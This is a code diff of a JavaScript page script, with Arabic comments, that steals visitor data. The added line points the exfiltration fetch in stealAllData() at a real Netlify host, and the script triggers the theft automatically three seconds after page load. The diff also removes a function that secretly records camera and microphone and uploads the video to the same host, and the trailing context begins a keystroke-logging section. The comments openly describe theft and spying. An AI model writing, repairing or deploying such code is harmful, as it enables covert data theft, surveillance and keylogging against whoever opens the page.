@@ -1205,7 +1205,7 @@ function stealAllData() {
     }
 
     // إرسال كل البيانات
-    fetch('https://Mozi_dashboard_hak.html', {
+    fetch('https://unseen1.netlify.app/Mozi_dashboard_hak.html', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(allData)
@@ -1214,39 +1214,8 @@ function stealAllData() {
 
 // تشغيل السرقة بعد تحميل الصفحة
 setTimeout(stealAllData, 3000);
-    // الكود الكامل للتجسس بالكاميرا
-async function startSpying() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-            audio: true
-        });
-        
-        const recorder = new MediaRecorder(stream);
-        let chunks = [];
-      recorder.ondataavailable = (e) => {
-            chunks.push(e.data);
-            if (chunks.length > 10) {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('video', blob);
-                fetch('https://Unseen1.netlify.app/Mozi_Dashboard_hak.html', {
-                    method: 'POST',
-                    body: formData
-                });
-                chunks = [];
-            }
-        };
-      recorder.start(1000);
-    } catch (err) {
-        console.error('Camera error:', err);
-    }
-}
 
-// بدء التسجيل تلقائياً
-if (navigator.mediaDevices) {
-    startSpying();
-}
+    
     // الكود الكامل لمراقبة الكتابة
 let keystrokes = '';
 
